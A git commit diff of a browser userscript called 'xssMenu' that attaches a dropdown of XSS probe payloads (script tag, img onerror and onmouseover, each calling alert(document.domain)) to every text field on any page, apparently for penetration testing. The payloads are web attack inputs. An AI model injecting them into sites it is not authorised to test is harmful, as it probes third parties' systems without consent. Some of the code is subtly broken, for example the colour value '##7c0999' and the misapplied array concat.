3cf91f54186ed7480d1de25dc9cb927cd98731ce
voidReq <100312344+voidReq@users.noreply.github.com>
2024-04-16 17:23:44 -0500

    Changes

--- main.js
+++ main.js
@@ -1,48 +1,55 @@
 // ==UserScript==
 // @name         xssMenu
 // @namespace    hi
-// @version      0.31
-// @description  Add sci-hub button on article page. Add sci-hub button after article link. Support Google scholar, bing academic and baidu xueshu. Jump CNKI English article to Chinese article.
-// @author       Dingar
+// @version      0.1
+// @description  XSS select menu
+// @author       voidReq
 // @include      *
 // ==/UserScript==
 
-var inputs = document.getElementsByTagName('input');
-var textBox = document.getElementsByName("p1")[0]
-var textBoxRect = textBox.getBoundingClientRect();
-
-
-
-var select = document.createElement("select");
-select.id = "mySelect";
-
-
-
-
-
-
 var payloads = [" ", "<script>alert(document.domain)</script>","<img src='#' onerror=alert(document.domain) />","<b onmouseover=alert(document.domain)>click me!</b>"];
-
-
 var select_width = 200;
 var select_height = 40;
-var selectX = textBoxRect.right + 65; // Adjust 10 pixels to the right of the text box
-var selectY = textBoxRect.top - 10;
 
-select.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: #00ccff; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
-select.style.opacity = "0.9";
+var allTextInputs = document.getElementsByTagName('input');
+var inputs = [];
 
+for (let i = 0; i < allTextInputs.length; i++) {
+    if (allTextInputs[i].type == "text") {
+        inputs.push(allTextInputs[i]);
+    }
+}
 
-select.onchange = function () {
-    document.getElementsByName("p1")[0].value = select.value
-};
+var allTextAreas = document.getElementsByTagName('textarea');
+//allTextAreas[i].value = "deca"
 
-for (var i = 0; i < payloads.length; i++) {
-    var option = document.createElement("option");
-    option.value = payloads[i];
-    option.text = payloads[i];
-    select.appendChild(option);
+inputs = inputs.concat(allTextAreas)
+
+function x(i, curVal) {
+    inputs[i].value = curVal;
 }
 
 
-textBox.parentNode.appendChild(select);
+for (let i = 0; i < inputs.length; i++) {
+    if(inputs[i].type=="text"){
+        var thisInput = inputs[i];
+        var select = document.createElement("select");
+        select.id = "mySelect" + i;
+        var inputRect = thisInput.getBoundingClientRect();
+        var selectX = inputRect.right + 65;
+        var selectY = inputRect.top - 10;
+        select.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: ##7c0999; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
+        select.style.opacity = "0.9";
+        for (let a = 0; a < payloads.length; a++) {
+            var option = document.createElement("option");
+            option.value = payloads[a];
+            option.text = payloads[a];
+            select.appendChild(option);
+        }
+        select.onchange = function () {
+            var curVal = select.value;
+            x(i, curVal);
+        };
+    inputs[i].parentNode.appendChild(select);
+}
+}
